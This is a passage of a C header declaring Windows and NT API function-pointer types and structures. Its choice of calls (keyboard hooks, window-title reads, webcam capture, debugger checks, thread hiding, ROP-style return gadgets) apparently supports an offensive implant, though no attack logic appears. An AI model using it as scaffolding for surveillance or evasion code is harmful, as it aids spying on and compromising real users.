typedef BOOL (WINAPI *pRegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
typedef BOOL (WINAPI *pCryptBinaryToStringW)(CONST BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPWSTR pszString, DWORD *pcchString);
typedef SECURITY_STATUS (WINAPI *pAcquireCredentialsHandleW)(LPCWSTR pszPrincipal, LPCWSTR pszPackage, ULONG fCredentialUse, PVOID pAuthData, PVOID pGetKeyFn, PVOID pvGetKeyFnArg, PVOID pGetCredentialFn, PVOID pvGetCredentialFnArg, PCredHandle phCredential);
typedef SECURITY_STATUS (WINAPI *pQuerySecurityPackageInfoW)(SEC_WCHAR *pszPackageName, PSecPkgInfoW *ppPackageInfo);
typedef SECURITY_STATUS (WINAPI *pInitializeSecurityContextW)(PCredHandle phCredential, PCtxtHandle phContext, SEC_WCHAR *pszTargetName, ULONG fContextReq, ULONG Reserved1, ULONG TargetDataRep, PSecBufferDesc pInput, ULONG Reserved2, PCtxtHandle phNewContext, PSecBufferDesc pOutput, ULONG *pfContextAttr, PTimeStamp ptsExpiry);

typedef WINBOOL (WINAPI *pDestroyWindow)(HWND hWnd);
typedef WINBOOL (WINAPI *pGetWindowRect)(HWND hWnd,LPRECT lpRect);
typedef WINBOOL (WINAPI *pGetClientRect)(HWND hWnd,LPRECT lpRect);
typedef ULONG (WINAPI *pGetAdaptersAddresses)(
  ULONG                 Family,
  ULONG                 Flags,
  PVOID                 Reserved,
  PIP_ADAPTER_ADDRESSES AdapterAddresses,
  PULONG                SizePointer
);
typedef HWND (WINAPI *pGetConsoleWindow)(void);
typedef VOID (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
typedef DWORD (WINAPI *pGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
typedef WINBOOL (WINAPI *pGetUserNameW)(LPWSTR lpBuffer, LPDWORD pcbBuffer);
typedef WINBOOL (WINAPI *pGetComputerNameW)(LPWSTR lpBuffer, LPDWORD nSize);
typedef WINBOOL (WINAPI *pGetComputerNameExW)(COMPUTER_NAME_FORMAT NameType, LPWSTR lpBuffer, LPDWORD nSize);
typedef WINBOOL (WINAPI *pQueryFullProcessImageNameW)(HANDLE hProcess, DWORD dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);
typedef WINBOOL (WINAPI *pIsWow64Process)(HANDLE hProcess, PBOOL Wow64Process);
typedef WINBOOL (WINAPI *pGetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
typedef UINT (WINAPI *pGetDoubleClickTime)(VOID);

typedef HWND (WINAPI *pcapCreateCaptureWindowA)(LPCSTR, DWORD, int, int, int, int, HWND, int);
typedef HWND (WINAPI *pcapCreateCaptureWindowW)(LPCWSTR, DWORD, int, int, int, int, HWND, int);
typedef int (WINAPI *pWideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef LRESULT (WINAPI *pSendMessageA)(HWND, UINT, WPARAM, LPARAM);
typedef LRESULT (WINAPI *pSendMessageW)(HWND, UINT, WPARAM, LPARAM);
typedef HWND (WINAPI *pcapCreateCaptureWindowA)(LPCSTR, DWORD, int, int, int, int, HWND, int);
typedef HWND (WINAPI *pcapCreateCaptureWindowW)(LPCWSTR, DWORD, int, int, int, int, HWND, int);
typedef WINBOOL (WINAPI *pLookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
typedef BOOL (WINAPI *pAdjustTokenPrivileges)(
  HANDLE            TokenHandle,
  BOOL              DisableAllPrivileges,
  PTOKEN_PRIVILEGES NewState,
  DWORD             BufferLength,
  PTOKEN_PRIVILEGES PreviousState,
  PDWORD            ReturnLength
);

typedef BOOL (WINAPI *pOpenProcessToken)(
  HANDLE  ProcessHandle,
  DWORD   DesiredAccess,
  PHANDLE TokenHandle
);

typedef BOOL (WINAPI* pExitWindowsEx)(
  UINT  uFlags,
  DWORD dwReason
);

typedef NTSTATUS (NTAPI *pNtInitiatePowerAction)(
    POWER_ACTION SystemAction,
    SYSTEM_POWER_STATE LightestSystemState,
    ULONG Flags, // POWER_ACTION_* flags
    BOOLEAN Asynchronous
    );

typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);
typedef PVOID PHEAP;

typedef PVOID (NTAPI *pRtlAllocateHeap)(
    _In_ PVOID HeapHandle,
    _In_opt_ ULONG Flags,
    _In_ SIZE_T Size
    );

typedef NTSTATUS (NTAPI *pRtlWaitOnAddress)(
    _In_ VOID *Address,
    _In_ VOID *CompareAddress,
    _In_ SIZE_T AddressSize,
    _In_opt_ PLARGE_INTEGER Timeout
    );

typedef VOID (NTAPI *pRtlWakeByAddressSingle)(
    _In_ VOID *Address
    );
typedef BOOLEAN (NTAPI *pRtlFreeHeap)(
    PHEAP HeapHandle,
    ULONG Flags,
    PVOID BaseAddress
);


typedef BOOL(WINAPI* pGetThreadContext)(
    HANDLE hThread,
    LPCONTEXT lpContext
    );

typedef BOOL(WINAPI* pSetThreadContext)(
    HANDLE hThread,
    CONST CONTEXT* lpContext
    );

typedef NTSTATUS(WINAPI* pNtOpenProcess)(
	OUT          PHANDLE            ProcessHandle,
	IN           ACCESS_MASK        DesiredAccess,
	IN           POBJECT_ATTRIBUTES ObjectAttributes,
	IN OPTIONAL  PCLIENT_ID         ClientId
);

typedef HLOCAL (WINAPI *pLocalAlloc)(UINT uFlags, SIZE_T uBytes);
typedef HLOCAL (WINAPI *pLocalFree)(HLOCAL hMem);

typedef NTSTATUS (NTAPI* pNtFlushInstructionCache)( HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T RegionSize);

typedef PVOID (WINAPI* pRtlAddVectoredExceptionHandler)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
typedef ULONG (WINAPI* pRtlRemoveVectoredExceptionHandler)(PVOID Handle);

typedef NTSTATUS (WINAPI* pNtDeleteFile)(PCOBJECT_ATTRIBUTES ObjectAttributes);

typedef HWND (WINAPI* pNtUserGetForegroundWindow)(VOID);
typedef BOOL   (WINAPI* pNtUserTranslateMessage)(IN CONST MSG *lpMsg, IN UINT flags);
typedef BOOL   (WINAPI* pNtUserUnhookWindowsHookEx)(IN HHOOK hhk);
typedef HHOOK    (WINAPI* pNtUserSetWindowsHookAW)(IN int nFilterType, IN HOOKPROC pfnFilterProc, IN DWORD dwFlags);

typedef int (WINAPI* pNtUserInternalGetWindowText)(IN HWND hwnd, LPWSTR lpString, int nMaxCount);

typedef LRESULT (WINAPI* pNtUserDispatchMessage)(IN CONST MSG *pmsg);
typedef BOOL 	(WINAPI* pNtUserGetMessage)(OUT LPMSG pmsg, IN HWND hwnd, IN UINT wMsgFilterMin, IN UINT wMsgFilterMax);

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)


typedef struct {
    DWORD  pid;
    CHAR   imageName[260];
} PROC_ENTRY;

#define UP -32
#define DOWN 32
#define STACK_ARGS_LENGTH 8
#define STACK_ARGS_RSP_OFFSET 0x28
#define X64_PEB_OFFSET 0x60

/* Randomized RET gadget collection */
#define MAX_RET_GADGETS 32

typedef struct _RET_GADGET {
    UINT64 addr;     /* address of 'add rsp, imm8; ret' sequence */
    UINT8  imm8;     /* the immediate value (stack adjustment) */
} RET_GADGET;

typedef struct tagPROCESSENTRY32W {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  WCHAR     szExeFile[MAX_PATH];
} PROCESSENTRY32W;
  typedef PROCESSENTRY32W *PPROCESSENTRY32W;
  typedef PROCESSENTRY32W *LPPROCESSENTRY32W;
typedef struct _FILE_DISPOSITION_INFORMATION
{
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;
typedef NTSTATUS (NTAPI* pNtQuerySystemTime)(
    _Out_ PLARGE_INTEGER SystemTime
    );
typedef int (WINAPI *pGetSystemMetrics)(int nIndex);
typedef BOOL (WINAPI *pCheckRemoteDebuggerPresent)(HANDLE, PBOOL);
typedef LRESULT (WINAPI *pCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
typedef WINBOOL (WINAPI *pPostMessageW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
typedef BOOL (WINAPI *pGetSystemTimeAsFileTime)(LPFILETIME lpFileTime);
typedef BOOL (WINAPI *pFileTimeToSystemTime)(CONST FILETIME* lpFileTime, LPSYSTEMTIME lpSystemTime);
typedef WINBOOL (WINAPI *pUnhookWindowsHookEx)(HHOOK hhk);
typedef WINBOOL (WINAPI *pKillTimer)(HWND hWnd,UINT_PTR uIDEvent);
typedef LRESULT (WINAPI *pTranslateMessage)(const MSG *lpMsg);
typedef LRESULT (WINAPI *pDispatchMessageA)(const MSG *lpMsg);
typedef WINBOOL (WINAPI *pGetMessageW)(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax);
typedef HHOOK (WINAPI *pSetWindowsHookExW)(int idHook,HOOKPROC lpfn,HINSTANCE hmod,DWORD dwThreadId);
typedef WINBOOL (WINAPI *pProcess32FirstW)(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
typedef WINBOOL (WINAPI *pProcess32NextW)(HANDLE hSnapshot,LPPROCESSENTRY32W lppe);
typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD dwFlags,DWORD th32ProcessID);
typedef LONG (WINAPI *pRegQueryValueExW)(HKEY hKey,LPCWSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,LPDWORD lpcbData);
typedef WINBOOL (WINAPI *pGetDiskFreeSpaceExW)(LPCWSTR lpDirectoryName,PULARGE_INTEGER lpFreeBytesAvailable,PULARGE_INTEGER lpTotalNumberOfBytes,PULARGE_INTEGER lpTotalNumberOfFreeBytes);
typedef DWORD (WINAPI *pGetWindowsDirectoryW)(LPWSTR lpBuffer, DWORD nSize);
typedef WORD (WINAPI *pRegisterClassW)(CONST WNDCLASSW *lpWndClass);
typedef HBRUSH (WINAPI *pGetSysColorBrush)(int nIndex);
typedef HCURSOR (WINAPI *pLoadCursorW)(HINSTANCE hInstance,LPCWSTR lpCursorName);
typedef WINBOOL (WINAPI *pGetCursorPos)(LPPOINT lpPoint);
typedef HWND (WINAPI *pFindWindowW)(LPCWSTR lpClassName,LPCWSTR lpWindowName);
typedef WINBOOL (WINAPI *pEnumSystemLocalesW)(LOCALE_ENUMPROCW lpLocaleEnumProc, DWORD dwFlags);

#ifndef InsertTailList
#define InsertTailList(ListHead, Entry)       \
    (Entry)->Flink        = (ListHead);       \
    (Entry)->Blink        = (ListHead)->Blink;\
    (ListHead)->Blink->Flink = (Entry);       \
    (ListHead)->Blink     = (Entry)
#endif

#ifndef InsertHeadList
#define InsertHeadList(ListHead, Entry)       \
    (Entry)->Flink        = (ListHead)->Flink;\
    (Entry)->Blink        = (ListHead);       \
    (ListHead)->Flink->Blink = (Entry);       \
    (ListHead)->Flink     = (Entry)
#endif

#ifndef RemoveEntryList
#define RemoveEntryList(Entry)                    \
    (Entry)->Blink->Flink = (Entry)->Flink;       \
    (Entry)->Flink->Blink = (Entry)->Blink;       \
    (Entry)->Flink        = (Entry);              \
    (Entry)->Blink        = (Entry)
#endif

#ifndef IsListEmpty
#define IsListEmpty(ListHead) \
    ((ListHead)->Flink == (ListHead))
#endif
typedef enum _THREADINFOCLASS
{
    ThreadBasicInformation,                         // q: THREAD_BASIC_INFORMATION
    ThreadTimes,                                    // q: KERNEL_USER_TIMES
    ThreadPriority,                                 // s: KPRIORITY (requires SeIncreaseBasePriorityPrivilege)
    ThreadBasePriority,                             // s: KPRIORITY
    ThreadAffinityMask,                             // s: KAFFINITY
    ThreadImpersonationToken,                       // s: HANDLE
    ThreadDescriptorTableEntry,                     // q: DESCRIPTOR_TABLE_ENTRY (or WOW64_DESCRIPTOR_TABLE_ENTRY)
    ThreadEnableAlignmentFaultFixup,                // s: BOOLEAN
    ThreadEventPair,                                // q: Obsolete
    ThreadQuerySetWin32StartAddress,                // q: PVOID
    ThreadZeroTlsCell,                              // s: ULONG // TlsIndex // 10
    ThreadPerformanceCount,                         // q: LARGE_INTEGER
    ThreadAmILastThread,                            // q: ULONG
    ThreadIdealProcessor,                           // s: ULONG
    ThreadPriorityBoost,                            // qs: ULONG
    ThreadSetTlsArrayAddress,                       // s: ULONG_PTR
    ThreadIsIoPending,                              // q: ULONG
    ThreadHideFromDebugger,                         // q: BOOLEAN; s: void
    ThreadBreakOnTermination,                       // qs: ULONG
    ThreadSwitchLegacyState,                        // s: void // NtCurrentThread // NPX/FPU
    ThreadIsTerminated,                             // q: ULONG // 20
    ThreadLastSystemCall,                           // q: THREAD_LAST_SYSCALL_INFORMATION
    ThreadIoPriority,                               // qs: IO_PRIORITY_HINT (requires SeIncreaseBasePriorityPrivilege)
    ThreadCycleTime,                                // q: THREAD_CYCLE_TIME_INFORMATION (requires THREAD_QUERY_LIMITED_INFORMATION)
    ThreadPagePriority,                             // qs: PAGE_PRIORITY_INFORMATION
    ThreadActualBasePriority,                       // s: LONG (requires SeIncreaseBasePriorityPrivilege)
    ThreadTebInformation,                           // q: THREAD_TEB_INFORMATION (requires THREAD_GET_CONTEXT + THREAD_SET_CONTEXT)
    ThreadCSwitchMon,                               // q: Obsolete
    ThreadCSwitchPmu,                               // q: Obsolete
    ThreadWow64Context,                             // qs: WOW64_CONTEXT, ARM_NT_CONTEXT since 20H1
    ThreadGroupInformation,                         // qs: GROUP_AFFINITY // 30
    ThreadUmsInformation,                           // q: THREAD_UMS_INFORMATION // Obsolete
    ThreadCounterProfiling,                         // q: BOOLEAN; s: THREAD_PROFILING_INFORMATION?
    ThreadIdealProcessorEx,                         // qs: PROCESSOR_NUMBER; s: previous PROCESSOR_NUMBER on return
    ThreadCpuAccountingInformation,                 // q: BOOLEAN; s: HANDLE (NtOpenSession) // NtCurrentThread // since WIN8
    ThreadSuspendCount,                             // q: ULONG // since WINBLUE
    ThreadHeterogeneousCpuPolicy,                   // q: KHETERO_CPU_POLICY // since THRESHOLD
    ThreadContainerId,                              // q: GUID
    ThreadNameInformation,                          // qs: THREAD_NAME_INFORMATION (requires THREAD_SET_LIMITED_INFORMATION)
    ThreadSelectedCpuSets,                          // q: ULONG[]
    ThreadSystemThreadInformation,                  // q: SYSTEM_THREAD_INFORMATION // 40
    ThreadActualGroupAffinity,                      // q: GROUP_AFFINITY // since THRESHOLD2
    ThreadDynamicCodePolicyInfo,                    // q: ULONG; s: ULONG (NtCurrentThread)
    ThreadExplicitCaseSensitivity,                  // qs: ULONG; s: 0 disables, otherwise enables // (requires SeDebugPrivilege and PsProtectedSignerAntimalware)
    ThreadWorkOnBehalfTicket,                       // q: ALPC_WORK_ON_BEHALF_TICKET // RTL_WORK_ON_BEHALF_TICKET_EX // NtCurrentThread
    ThreadSubsystemInformation,                     // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2
    ThreadDbgkWerReportActive,                      // s: ULONG; s: 0 disables, otherwise enables
    ThreadAttachContainer,                          // s: HANDLE (job object) // NtCurrentThread
    ThreadManageWritesToExecutableMemory,           // s: MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3
    ThreadPowerThrottlingState,                     // qs: POWER_THROTTLING_THREAD_STATE // since REDSTONE3 (set), WIN11 22H2 (query)
    ThreadWorkloadClass,                            // q: THREAD_WORKLOAD_CLASS // since REDSTONE5 // 50
    ThreadCreateStateChange,                        // s: Obsolete // since WIN11
    ThreadApplyStateChange,                         // s: Obsolete
    ThreadStrongerBadHandleChecks,                  // s: ULONG // NtCurrentThread // since 22H1
    ThreadEffectiveIoPriority,                      // q: IO_PRIORITY_HINT
    ThreadEffectivePagePriority,                    // q: ULONG
    ThreadUpdateLockOwnership,                      // s: THREAD_LOCK_OWNERSHIP // since 24H2
    ThreadSchedulerSharedDataSlot,                  // q: SCHEDULER_SHARED_DATA_SLOT_INFORMATION
    ThreadTebInformationAtomic,                     // q: THREAD_TEB_INFORMATION (requires THREAD_GET_CONTEXT + THREAD_QUERY_INFORMATION)
    ThreadIndexInformation,                         // q: THREAD_INDEX_INFORMATION
    MaxThreadInfoClass
} THREADINFOCLASS;

typedef NTSTATUS (NTAPI *pNtSetInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _In_ PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength
    );

typedef NTSTATUS (NTAPI *pNtQueryInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_ PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength
    );

typedef NTSTATUS (NTAPI *pNtOpenThread)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId
    );

typedef NTSTATUS (NTAPI *pNtSuspendThread)(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
    );

typedef HMODULE (WINAPI* pGetModuleHandleW)(LPCWSTR lpModuleName);
typedef HRSRC (WINAPI* pFindResourceA)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
typedef HRSRC (WINAPI* pFindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);

typedef HGLOBAL (WINAPI* pLoadResource)(HMODULE hModule, HRSRC hResInfo);
typedef DWORD (WINAPI* pSizeofResource)(HMODULE hModule, HRSRC hResInfo);
typedef LPVOID (WINAPI* pLockResource)(HGLOBAL hResData);

typedef NTSTATUS (NTAPI *pNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *pNtQueryValueKey)(HANDLE, PUNICODE_STRING, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pRtlFormatCurrentUserKeyPath)(PUNICODE_STRING);
typedef VOID     (NTAPI *pRtlFreeUnicodeString)(PUNICODE_STRING);
typedef VOID     (NTAPI *pRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

typedef VOID NTAPI RTL_WORK_CALLBACK(
    _In_ PVOID ThreadParameter
    );
typedef RTL_WORK_CALLBACK* PRTL_WORK_CALLBACK;
typedef NTSTATUS (NTAPI* pRtlQueueWorkItem)(
    _In_ PRTL_WORK_CALLBACK Function,
    _In_opt_ PVOID Context,
    _In_ ULONG Flags
    );

typedef NTSTATUS (NTAPI* pNtSetEvent)(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState
    );

typedef BOOL (WINAPI *pFlushFileBuffers)(HANDLE hFile);

typedef int (WINAPI* pMessageBoxA)(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);
typedef WINBOOL     (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
typedef BOOL(WINAPI* pWinHttpAddRequestHeaders)(HINTERNET,LPCWSTR,DWORD,DWORD);
typedef BOOL (NTAPI *pRtlTimeToSecondsSince1970)(PLARGE_INTEGER Time,PULONG ElapsedSeconds);

typedef WINBOOL  (WINAPI *pWinHttpSetTimeouts)(HINTERNET,int,int,int,int);

typedef struct _RTLP_CURDIR_REF
{
    LONG ReferenceCount;
    HANDLE DirectoryHandle;
} RTLP_CURDIR_REF, *PRTLP_CURDIR_REF;

typedef struct _RTL_RELATIVE_NAME_U
{
    UNICODE_STRING RelativeName;
    HANDLE ContainingDirectory;
    PRTLP_CURDIR_REF CurDirRef;
} RTL_RELATIVE_NAME_U, *PRTL_RELATIVE_NAME_U;

typedef BOOLEAN (NTAPI *pRtlDosPathNameToRelativeNtPathName_U)(
    PCWSTR DosFileName,
    PUNICODE_STRING NtFileName,
    PWSTR* FilePath,
    PRTL_RELATIVE_NAME_U RelativeName
);
/**
 * The PROCESS_BASIC_INFORMATION structure contains basic information about a process.
 *
 * \remarks https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#process_basic_information
 */
typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;                    // The exit status of the process. (GetExitCodeProcess)
    PPEB PebBaseAddress;                    // A pointer to the process environment block (PEB) of the process.
    KAFFINITY AffinityMask;                 // The affinity mask of the process. (GetProcessAffinityMask) (deprecated)
    KPRIORITY BasePriority;                 // The base priority of the process. (GetPriorityClass)
    HANDLE UniqueProcessId;                 // The unique identifier of the process. (GetProcessId)
    HANDLE InheritedFromUniqueProcessId;    // The unique identifier of the parent process.
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

#define PROCESS_CREATE_FLAGS_NONE 0x00000000
#define PROCESS_CREATE_FLAGS_BREAKAWAY 0x00000001                               // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT 0x00000002                        // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004                         // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_OVERRIDE_ADDRESS_SPACE 0x00000008                  // NtCreateProcessEx only
#define PROCESS_CREATE_FLAGS_LARGE_PAGES 0x00000010                             // NtCreateProcessEx only (requires SeLockMemoryPrivilege)
#define PROCESS_CREATE_FLAGS_LARGE_PAGE_SYSTEM_DLL 0x00000020                   // NtCreateProcessEx only (requires SeLockMemoryPrivilege)
#define PROCESS_CREATE_FLAGS_PROTECTED_PROCESS 0x00000040                       // NtCreateUserProcess only
#define PROCESS_CREATE_FLAGS_CREATE_SESSION 0x00000080                          // NtCreateProcessEx & NtCreateUserProcess (requires SeLoadDriverPrivilege)
#define PROCESS_CREATE_FLAGS_INHERIT_FROM_PARENT 0x00000100                     // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_CREATE_SUSPENDED 0x00000200                        // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_FORCE_BREAKAWAY 0x00000400                         // NtCreateProcessEx & NtCreateUserProcess (requires SeTcbPrivilege)
#define PROCESS_CREATE_FLAGS_MINIMAL_PROCESS 0x00000800                         // NtCreateProcessEx only
#define PROCESS_CREATE_FLAGS_RELEASE_SECTION 0x00001000                         // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_CLONE_MINIMAL 0x00002000                           // NtCreateProcessEx only
#define PROCESS_CREATE_FLAGS_CLONE_MINIMAL_REDUCED_COMMIT 0x00004000
#define PROCESS_CREATE_FLAGS_AUXILIARY_PROCESS 0x00008000                       // NtCreateProcessEx & NtCreateUserProcess (requires SeTcbPrivilege)
#define PROCESS_CREATE_FLAGS_CREATE_STORE 0x00020000                            // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_USE_PROTECTED_ENVIRONMENT 0x00040000               // NtCreateProcessEx & NtCreateUserProcess
#define PROCESS_CREATE_FLAGS_IMAGE_EXPANSION_MITIGATION_DISABLE 0x00080000
#define PROCESS_CREATE_FLAGS_PARTITION_CREATE_SLAB_IDENTITY 0x00400000          // NtCreateProcessEx & NtCreateUserProcess (requires SeLockMemoryPrivilege)

#define THREAD_CREATE_FLAGS_NONE 0x00000000
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004 // NtCreateThreadEx only
#define THREAD_CREATE_FLAGS_LOADER_WORKER 0x00000010 // NtCreateThreadEx only // since THRESHOLD
#define THREAD_CREATE_FLAGS_SKIP_LOADER_INIT 0x00000020 // NtCreateThreadEx only // since REDSTONE2
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE 0x00000040 // NtCreateThreadEx only // since 19H1

// private
#define PS_ATTRIBUTE_NUMBER_MASK 0x0000ffff
#define PS_ATTRIBUTE_THREAD 0x00010000 // may be used with thread creation
#define PS_ATTRIBUTE_INPUT 0x00020000 // input only
#define PS_ATTRIBUTE_ADDITIVE 0x00040000 // "accumulated" e.g. bitmasks, counters, etc.

#define PsAttributeValue(Number, Thread, Input, Additive) \
    (((Number) & PS_ATTRIBUTE_NUMBER_MASK) | \
    ((Thread) ? PS_ATTRIBUTE_THREAD : 0) | \
    ((Input) ? PS_ATTRIBUTE_INPUT : 0) | \
    ((Additive) ? PS_ATTRIBUTE_ADDITIVE : 0))

#define PS_ATTRIBUTE_PARENT_PROCESS \
    PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_DEBUG_OBJECT \
    PsAttributeValue(PsAttributeDebugObject, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_TOKEN \
    PsAttributeValue(PsAttributeToken, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_CLIENT_ID \
    PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_TEB_ADDRESS \
    PsAttributeValue(PsAttributeTebAddress, TRUE, FALSE, FALSE)
#define PS_ATTRIBUTE_IMAGE_NAME \
    PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IMAGE_INFO \
    PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE)
#define PS_ATTRIBUTE_MEMORY_RESERVE \
    PsAttributeValue(PsAttributeMemoryReserve, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PRIORITY_CLASS \
    PsAttributeValue(PsAttributePriorityClass, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ERROR_MODE \
    PsAttributeValue(PsAttributeErrorMode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_STD_HANDLE_INFO \
    PsAttributeValue(PsAttributeStdHandleInfo, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_HANDLE_LIST \
    PsAttributeValue(PsAttributeHandleList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_GROUP_AFFINITY \
    PsAttributeValue(PsAttributeGroupAffinity, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_PREFERRED_NODE \
    PsAttributeValue(PsAttributePreferredNode, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_IDEAL_PROCESSOR \
    PsAttributeValue(PsAttributeIdealProcessor, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_UMS_THREAD \
    PsAttributeValue(PsAttributeUmsThread, TRUE, TRUE, FALSE)
#define PS_ATTRIBUTE_MITIGATION_OPTIONS \
    PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_PROTECTION_LEVEL \
    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_WIN32K_FILTER \
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM \
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_BNO_ISOLATION \
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY \
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHPE \
    PsAttributeValue(PsAttributeChpe, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_MITIGATION_AUDIT_OPTIONS \
    PsAttributeValue(PsAttributeMitigationAuditOptions, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_MACHINE_TYPE \
    PsAttributeValue(PsAttributeMachineType, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_COMPONENT_FILTER \
    PsAttributeValue(PsAttributeComponentFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ENABLE_OPTIONAL_XSTATE_FEATURES \
    PsAttributeValue(PsAttributeEnableOptionalXStateFeatures, TRUE, TRUE, FALSE)


 /**
 * The NtReadVirtualMemory routine reads virtual memory from a process.
 *
 * \param ProcessHandle A handle to the process whose memory is to be read.
 * \param BaseAddress A pointer to the base address in the specified process from which to read.
